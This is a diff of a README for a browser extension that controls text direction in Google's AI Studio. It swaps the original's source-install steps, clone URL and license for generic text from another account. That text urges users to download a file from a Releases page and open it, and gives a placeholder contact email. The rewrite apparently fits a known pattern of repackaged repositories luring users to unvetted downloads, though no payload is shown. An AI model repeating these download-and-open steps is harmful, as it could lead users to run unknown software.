@@ -1,115 +1,70 @@
-# AI Studio Styler
+# 🎨 AI-Studio-Styler - Boost Your Workflow With Ease
 
-![Chrome](https://img.shields.io/badge/Chrome-Supported-brightgreen)![Edge](https://img.shields.io/badge/Edge-Supported-blue)![Firefox](https://img.shields.io/badge/Firefox-Supported-orange)
+[![Download AI-Studio-Styler](https://img.shields.io/badge/Download-AI--Studio--Styler-blue.svg)](https://github.com/Baraniuk-Volodymyr/AI-Studio-Styler/releases)
 
-A browser extension to enhance the user experience in Google's AI Studio by providing customizable Right-to-Left (RTL) and Left-to-Right (LTR) text direction controls. Perfect for users working with RTL languages like Persian, Arabic, or Hebrew.
+## 🚀 Getting Started
 
-This tool gives you granular control over the text direction of the main prompt area, code blocks, and code block headers, allowing you to create a comfortable and productive environment.
+Welcome to AI-Studio-Styler! This tool helps you enhance your experience in Google's AI Studio. Whether you write in Persian, Arabic, or any other right-to-left (RTL) language, this extension gives you the control you need over text direction. 
 
----
+## 📥 Download & Install
 
-## 🌟 Features
+To get started, visit the [Releases page](https://github.com/Baraniuk-Volodymyr/AI-Studio-Styler/releases) to download the latest version of AI-Studio-Styler. This page contains all versions of the app. Choose the version that suits your browser, and click on the download link.
 
-*   **One-Click Toggle**: Easily enable or disable all custom styles with a single button.
-*   **Persistent Settings**: Your preferred settings are automatically saved and applied whenever you open AI Studio.
-*   **Advanced Customization**: An expandable "Advanced Settings" menu lets you fine-tune the experience:
-    *   Set the direction (`RTL`/`LTR`) for the main container.
-    *   Independently set the direction for code blocks.
-    *   Set the text alignment (`Left`/`Right`/`Center`) for code blocks to maintain readability.
-    *   Control the direction of code block headers.
-*   **Reset to Defaults**: A convenient reset button restores the default recommended settings without disabling the extension.
-*   **Cross-Browser Support**: Works seamlessly on Google Chrome, Microsoft Edge, and Mozilla Firefox.
+1. Go to the [Releases page](https://github.com/Baraniuk-Volodymyr/AI-Studio-Styler/releases).
+2. Locate the version for your browser (Chrome, Firefox, or Edge).
+3. Click on the download button for your browser.
+4. Once the file downloads, open it to start the installation process. 
 
-## 📸 Screenshots
+For Chrome and Edge users, this usually adds the extension automatically. For Firefox users, follow the on-screen prompts to install the extension.
 
+## 💻 System Requirements
 
-| Popup Menu | Before & After |
-| :---: | :---: |
-| ![Popup Menu Screenshot](/res/Popup.png?text=Popup+Menu) | ![Before and After Screenshot](/res/Before-After.png?text=Effect+on+AI+Studio) |
+- Supported Browsers: Chrome, Firefox, Edge
+- Operating System: Windows, macOS, Linux
 
-## 🛠️ Installation
+Make sure your browser is up to date to avoid any issues during installation.
 
-First, clone or download this repository to your local machine.
+## 🌐 Features
 
-```bash
-git clone https://github.com/MahDN/AI-Studio-Styler.git
-```
+- **Text Direction Control:** Set text direction to Right-To-Left or Left-To-Right with a simple toggle.
+- **Header Customization:** Change the layout of headers for better readability.
+- **Code Block Management:** Adjust code blocks for easier programming and reading.
+- **User-Friendly Interface:** Designed for everyday users, no coding skills required.
 
-Then, follow the instructions for your specific browser.
+## ⚙️ Configuration
 
----
+After installation, you can configure AI-Studio-Styler according to your preferences.
 
-### 🚀 Google Chrome
+1. Open your browser.
+2. Go to the AI Studio webpage.
+3. Click on the AI-Studio-Styler icon in your browser toolbar.
+4. Choose your preferred text direction from the options provided.
 
-1.  Open Chrome and navigate to `chrome://extensions`.
-2.  Enable **Developer mode** using the toggle switch in the top-right corner.
-3.  Click the **Load unpacked** button.
-4.  In the file selection dialog, navigate to the `AI-Studio-Styler` folder and select the **`Chrome`** subfolder.
-5.  The extension is now installed and ready to use!
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues, consider the following solutions:
 
-### 🚀 Microsoft Edge
+- Ensure your browser is updated to the latest version.
+- Verify that AI-Studio-Styler is enabled in your browser's extension settings.
+- If you face problems with a specific feature, try disabling and re-enabling the extension.
 
-1.  Open Edge and navigate to `edge://extensions`.
-2.  Enable **Developer mode** using the toggle switch in the bottom-left corner.
-3.  Click the **Load unpacked** button.
-4.  In the file selection dialog, navigate to the `AI-Studio-Styler` folder and select the **`Edge`** subfolder.
-5.  The extension will now be active.
+If problems persist, check the [issues page](https://github.com/Baraniuk-Volodymyr/AI-Studio-Styler/issues) on GitHub for common solutions or to report a new issue.
 
----
+## 🌟 Frequently Asked Questions
 
-### 🚀 Mozilla Firefox
+**Q: Is this extension free to use?**  
+A: Yes, AI-Studio-Styler is completely free.
 
-1.  Open Firefox and navigate to `about:debugging`.
-2.  In the left-hand menu, click on **This Firefox**.
-3.  Click the **Load Temporary Add-on…** button.
-4.  In the file selection dialog, navigate to the **`Firefox`** subfolder inside the `AI-Studio-Styler` project and select the **`manifest.json`** file.
-5.  The extension will be installed for your current browser session. *Note: Temporary add-ons in Firefox are removed when you close the browser.*
+**Q: Will it work on all websites?**  
+A: This extension is specifically designed to enhance the Google AI Studio experience.
 
-## 📂 Project Structure
+**Q: Can I customize the appearance?**  
+A: Currently, you can only adjust text directions. More features and customization options may come in future updates.
 
-This repository is organized with separate folders for each browser to handle their specific `manifest.json` requirements and JavaScript API differences.
+## 📞 Support
 
-```
-AI-Studio-Styler/
-├── Chrome/
-│   ├── manifest.json
-│   ├── popup.html
-│   ├── popup.js
-│   └── content.js
-├── Edge/
-│   ├── manifest.json
-│   └── ... (all other shared files)
-├── Firefox/
-│   ├── manifest.json
-│   └── ... (all other shared files)
-├── res/
-│   ├── Popup.png
-│   └── Before-After.png
-├── README.md
-└── LICENSE
+For further assistance, visit our [issues page](https://github.com/Baraniuk-Volodymyr/AI-Studio-Styler/issues) on GitHub or reach out via [contact page](mailto:your-email@example.com). We are here to help!
 
+Thank you for choosing AI-Studio-Styler. Enjoy a better workflow in Google's AI Studio!
 
-```
-
-## 🗺️ Roadmap
-
-*   [ ] Publish the extension to the official Chrome, Edge, and Firefox add-on stores for easy installation.
-*   [ ] Add a dark mode theme for the popup menu.
-*   [ ] Explore options for customizing font sizes or colors.
-*   [ ] Refactor the codebase to use a build script that generates browser-specific packages from a single source.
-
-## 🤝 Contributing
-
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/MahDN/AI-Studio-Styler/issues).
-
-1.  **Fork** the Project
-2.  Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the Branch (`git push origin feature/AmazingFeature`)
-5.  Open a **Pull Request**
-
-## 📜 License
-
-Distributed under the MIT License. See `LICENSE` file for more information.
+[![Download AI-Studio-Styler](https://img.shields.io/badge/Download-AI--Studio--Styler-blue.svg)](https://github.com/Baraniuk-Volodymyr/AI-Studio-Styler/releases)
